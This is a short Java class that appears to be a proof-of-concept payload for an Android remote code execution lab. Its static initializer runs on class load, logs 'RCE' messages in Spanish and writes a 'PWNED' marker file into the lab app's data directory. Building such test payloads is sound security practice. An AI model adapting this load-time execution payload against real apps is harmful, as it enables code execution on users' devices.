package pwn;

import android.util.Log;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

public class Shell {
    static {
        Log.e("RCE", "💥 STATIC INITIALIZER EJECUTADO");

        try {
            // Usar Java puro en lugar de Runtime.exec()
            String content = "PWNED " + new Date().toString() + "\n";
            FileWriter writer = new FileWriter("/data/data/com.app.lab.rce/files/pwned.txt");
            writer.write(content);
            writer.close();
            Log.e("RCE", "✅ Archivo pwned.txt creado exitosamente");
        } catch (IOException e) {
            Log.e("RCE", "❌ Error escribiendo archivo: " + e.getMessage());
        }
    }
}
